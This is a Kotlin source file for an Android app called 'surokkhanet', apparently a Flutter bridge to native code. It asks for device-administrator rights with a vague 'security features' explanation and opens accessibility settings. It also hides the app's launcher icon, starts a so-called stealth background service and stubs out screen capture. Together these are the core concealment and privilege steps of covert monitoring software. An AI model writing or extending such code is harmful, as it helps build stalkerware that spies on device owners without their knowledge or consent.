package com.surokkhanet

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.provider.Settings
import androidx.core.content.ContextCompat
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class NativeBridge(private val context: Context, private val activity: Activity) {

    private val channelName = "com.surokkhanet/native"

    fun configure(flutterEngine: FlutterEngine) {
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, channelName).setMethodCallHandler { call, result ->
            when (call.method) {
                "activateDeviceAdmin" -> {
                    activateDeviceAdmin()
                    result.success(true)
                }
                "openAccessibilitySettings" -> {
                    openAccessibilitySettings()
                    result.success(true)
                }
                "hideAppIcon" -> {
                    hideAppIcon()
                    result.success(true)
                }
                "startStealthService" -> {
                    startBackgroundService()
                    result.success(true)
                }
                "captureScreen" -> {
                    // placeholder path
                    result.success("/sdcard/screenshot.png")
                }
                "removeDeviceAdmin" -> {
                    val ok = removeDeviceAdmin()
                    result.success(ok)
                }
                "uninstallSelf" -> {
                    uninstallSelf()
                    result.success(true)
                }
                else -> result.notImplemented()
            }
        }
    }

    private fun activateDeviceAdmin() {
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(context, DeviceAdminReceiver::class.java))
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for security features")
        }
        activity.startActivityForResult(intent, 100)
    }

    private fun openAccessibilitySettings() {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        context.startActivity(intent)
    }

    private fun hideAppIcon() {
        val componentName = ComponentName(context.packageName, "${context.packageName}.MainActivity")
        try {
            context.packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            // Some launchers behave differently; ignore
        }
    }

    private fun startBackgroundService() {
        val intent = Intent(context, BackgroundService::class.java)
        ContextCompat.startForegroundService(context, intent)
    }

    fun removeDeviceAdmin(): Boolean {
        try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val comp = ComponentName(context, DeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(comp)) {
                dpm.removeActiveAdmin(comp)
            }
            return true
        } catch (e: Exception) {
            return false
        }
    }

    fun uninstallSelf() {
        try {
            val intent = Intent(Intent.ACTION_DELETE)
            intent.data = Uri.parse("package:" + context.packageName)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
        } catch (e: Exception) {
            // ignore
        }
    }
}
